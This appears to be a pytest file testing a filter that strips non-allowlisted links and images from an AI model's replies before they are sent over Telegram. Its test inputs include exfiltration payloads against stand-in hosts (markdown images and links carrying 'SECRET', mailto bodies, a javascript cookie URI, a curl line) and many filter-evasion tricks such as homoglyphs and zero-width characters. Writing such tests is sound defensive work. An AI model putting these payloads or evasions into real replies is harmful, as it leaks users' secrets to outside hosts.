# Copyright (c) Nimbus. All rights reserved.
# Private, unpublished, proprietary. Do not distribute.

"""P4.3 outbound exfil filter: table-driven unit tests (pure functions).

The filter sits between the model reply and the Telegram send. It must leave
no clickable link to a host that is not on the reply allowlist, never let an
image / data / javascript URI through, and fail closed (fixed notice) when its
own post-check still finds a link."""

from __future__ import annotations

import time

import pytest

from src.gateway import exfil
from src.gateway.exfil import (
    BLOCKED_NOTICE,
    IMAGE_REMOVED,
    LINK_REMOVED,
    ReplyUrlPolicy,
    filter_reply,
    find_links,
)

NONE = ReplyUrlPolicy()
DOCS = ReplyUrlPolicy(frozenset({"docs.python.org", "example.org"}))


# (id, input, expected output) with the default (empty) allowlist.
CASES: list[tuple[str, str, str]] = [
    ("plain", "Hello there, how are you?", "Hello there, how are you?"),
    ("numbers", "Pi is 3.14 and v2.0 shipped at 10:30.", "Pi is 3.14 and v2.0 shipped at 10:30."),
    ("abbrev", "e.g. this, i.e. that, a.m. and U.S.", "e.g. this, i.e. that, a.m. and U.S."),
    ("ellipsis", "wait...what", "wait...what"),
    ("md_image", "look ![x](https://evil.example/p.png?d=SECRET) ok", f"look {IMAGE_REMOVED} ok"),
    ("md_image_ref", "![x][1]", IMAGE_REMOVED),
    ("html_img", '<img src="https://evil.example/a.png">', IMAGE_REMOVED),
    ("md_link", "[click](https://evil.example/?q=SECRET)", f"click {LINK_REMOVED}"),
    ("md_link_empty", "[](https://evil.example/x)", LINK_REMOVED),
    ("md_link_title", '[a](https://evil.example "t")', f"a {LINK_REMOVED}"),
    ("ref_def", "see [a]\n\n[a]: https://evil.example/?d=1", f"see [a]\n\n{LINK_REMOVED}"),
    ("autolink", "<https://evil.example/x>", f"<{LINK_REMOVED}>"),
    ("bare_url", "go to https://evil.example/x?d=SECRET now", f"go to {LINK_REMOVED} now"),
    ("bare_url_trailing", "see http://evil.example.", f"see {LINK_REMOVED}."),
    ("www", "www.evil.example/path", LINK_REMOVED),
    ("domain_only", "the site evil.com is down", "the site evil[.]com is down"),
    ("domain_path", "evil.com/x?d=SECRET", LINK_REMOVED),
    ("domain_port", "evil.com:8080", LINK_REMOVED),
    ("email", "mail bob@evil.com", "mail bob@evil[.]com"),
    ("userinfo", "https://docs.python.org@evil.example/", LINK_REMOVED),
    ("protocol_relative", "//evil.com/x", f"//{LINK_REMOVED}"),
    ("javascript", "javascript:alert(document.cookie)", LINK_REMOVED + ")"),
    ("data_uri", "data:text/html;base64,PHNjcmlwdD4=", LINK_REMOVED),
    ("tg_scheme", "tg://resolve?domain=evil", LINK_REMOVED),
    ("mailto", "mailto:x@evil.com?body=SECRET", LINK_REMOVED),
    ("ipv4", "http://10.0.0.1/a", LINK_REMOVED),
    ("ipv4_bare_path", "1.2.3.4/x?d=SECRET", LINK_REMOVED),
    ("decimal_ip", "http://2130706433/", LINK_REMOVED),
    ("ipv6", "http://[::1]:80/x", LINK_REMOVED),
    ("punycode", "xn--pypal-4ve.com", "xn--pypal-4ve[.]com"),
    ("punycode_tld", "evil.xn--p1ai/x", LINK_REMOVED),
    ("code_fence", "```\ncurl https://evil.example/x\n```", f"```\ncurl {LINK_REMOVED}\n```"),
    ("zero_width_host", "evil\u200b.com/x", LINK_REMOVED),
    ("zero_width_scheme", "ht\u200dtps://evil.example", LINK_REMOVED),
    ("fullwidth_dot", "evil\uff0ecom/x", LINK_REMOVED),
    ("ideographic_dot", "evil\u3002com/x", LINK_REMOVED),
    ("fullwidth_scheme", "\uff48\uff54\uff54\uff50\uff53://evil.example", LINK_REMOVED),
    ("bidi_override", "\u202eevil.com/x", LINK_REMOVED),
    ("homoglyph_label", "\u0440\u0430ypal.com/login", LINK_REMOVED),
    ("backslash", "https:\\\\evil.example\\x", LINK_REMOVED),
    ("dot_prefix", "..evil.com/x?d=S", f"..{LINK_REMOVED}"),
    ("ellipsis_prefix", "…evil.com/x", f"...{LINK_REMOVED}"),
    ("dot_prefix_scheme", ".https://evil.example/x", f".{LINK_REMOVED}"),
    ("dot_prefix_ip", "x..1.2.3.4/x", f"x..{LINK_REMOVED}"),
    ("soft_hyphen", "evil\u00ad.com/x", LINK_REMOVED),
    ("japanese_kept", "\u3053\u308c\u306f\u3002\u6b21", "\u3053\u308c\u306f\u3002\u6b21"),
]


@pytest.mark.parametrize(("case", "src", "want"), CASES, ids=[c[0] for c in CASES])
def test_filter_table(case: str, src: str, want: str) -> None:
    out = filter_reply(src, NONE)
    assert not out.blocked, case
    assert out.text == want
    assert find_links(out.text, NONE) == []


ALLOWED: list[tuple[str, str, str]] = [
    ("allowed_url", "https://docs.python.org/3/library/re.html", "same"),
    ("allowed_md_link", "[re](https://docs.python.org/3/)", "re (https://docs.python.org/3/)"),
    ("allowed_domain", "see example.org.", "same"),
    ("allowed_bare_path", "example.org/a/b", "same"),
    ("allowed_but_query", "https://docs.python.org/s?q=SECRET", LINK_REMOVED),
    ("allowed_but_fragment", "https://docs.python.org/#SECRET", LINK_REMOVED),
    ("allowed_but_http", "http://docs.python.org/3/", LINK_REMOVED),
    ("allowed_but_port", "https://docs.python.org:444/", LINK_REMOVED),
    ("allowed_but_percent", "https://docs.python.org/%53ECRET", LINK_REMOVED),
    ("allowed_but_userinfo", "https://u:p@docs.python.org/", LINK_REMOVED),
    ("allowed_suffix_trick", "https://docs.python.org.evil.example/", LINK_REMOVED),
    ("allowed_subdomain_not_implied", "https://a.example.org/", LINK_REMOVED),
    ("allowed_uppercase_refused", "https://DOCS.python.org/", LINK_REMOVED),
    ("allowed_image_still_removed", "![a](https://docs.python.org/x.png)", IMAGE_REMOVED),
    ("allowed_long_path", "https://docs.python.org/" + "a" * 300, LINK_REMOVED),
]


@pytest.mark.parametrize(("case", "src", "want"), ALLOWED, ids=[c[0] for c in ALLOWED])
def test_allowlist_table(case: str, src: str, want: str) -> None:
    out = filter_reply(src, DOCS)
    assert not out.blocked, case
    assert out.text == (src if want == "same" else want)
    assert find_links(out.text, DOCS) == []


def test_empty_allowlist_allows_nothing() -> None:
    assert not NONE.allows("https://docs.python.org/3/")
    assert DOCS.allows("https://docs.python.org/3/")


def test_removed_count_reported() -> None:
    out = filter_reply("![a](https://e.example/x) https://e.example/y evil.com", NONE)
    assert out.removed == 3


def test_nothing_removed_for_clean_text() -> None:
    assert filter_reply("hi", NONE).removed == 0


def test_blocked_notice_is_itself_clean() -> None:
    assert find_links(BLOCKED_NOTICE, NONE) == []
    assert filter_reply(BLOCKED_NOTICE, NONE).text == BLOCKED_NOTICE


def test_fails_closed_when_a_rewrite_pass_is_broken(monkeypatch: pytest.MonkeyPatch) -> None:
    """Mutation proof of the post-check: disable every rewriting pass and the
    reply must be blocked with the fixed notice, never sent with the link."""
    monkeypatch.setattr(exfil, "_neutralise", lambda text, policy: (text, 0))
    out = filter_reply("go https://evil.example/?d=SECRET", NONE)
    assert out.blocked and out.text == BLOCKED_NOTICE
    assert "SECRET" not in out.text


def test_fails_closed_on_internal_error(monkeypatch: pytest.MonkeyPatch) -> None:
    def boom(text: str, policy: ReplyUrlPolicy) -> tuple[str, int]:
        raise RuntimeError("bug")

    monkeypatch.setattr(exfil, "_neutralise", boom)
    out = filter_reply("hello", NONE)
    assert out.blocked and out.text == BLOCKED_NOTICE


def test_find_links_reports_kind_not_content() -> None:
    hits = find_links("x https://evil.example/?d=SECRET y", NONE)
    assert hits == ["scheme"]


@pytest.mark.parametrize(
    "bad",
    ["", "*.example.org", "https://example.org", "example", "10.0.0.1", "Example.org", "a..b.org"],
)
def test_policy_rejects_bad_allowlist_entries(bad: str) -> None:
    with pytest.raises(ValueError):
        ReplyUrlPolicy(frozenset({bad}))


@pytest.mark.parametrize(
    "s",
    [
        "a." * 50_000,
        "a" * 100_000 + ".",
        ("x" * 60 + ".") * 2000,
        "[" * 20_000 + "](" * 20_000,
        "1." * 50_000,
        "http://" * 10_000,
    ],
    ids=["dots", "longword", "labels", "brackets", "digits", "schemes"],
)
def test_pathological_input_is_fast(s: str) -> None:
    t0 = time.perf_counter()
    filter_reply(s, NONE)
    assert time.perf_counter() - t0 < 2.0
